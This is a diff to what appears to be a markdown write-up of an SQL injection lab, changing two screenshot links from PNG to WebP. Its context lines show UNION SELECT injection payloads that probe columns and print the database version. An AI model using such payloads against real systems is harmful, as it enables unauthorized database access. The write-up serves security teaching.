@@ -43,13 +43,13 @@ Testing shows that there are two categories returned, and the following payload 
 Accessories' UNION SELECT null,'abc'-- -
 ```
 
-![](attachments/sqli-lab-4/file-20251124113610607.png)
+![](attachments/sqli-lab-4/file-20251124113610607.webp)
 Now we can send the following request to print out the database version:
 
 ```text title="Print the database version"
 Accessories' UNION SELECT null,@@version-- -
 ```
 
-![](attachments/sqli-lab-4/file-20251124113610608.png)
+![](attachments/sqli-lab-4/file-20251124113610608.webp)
 
 
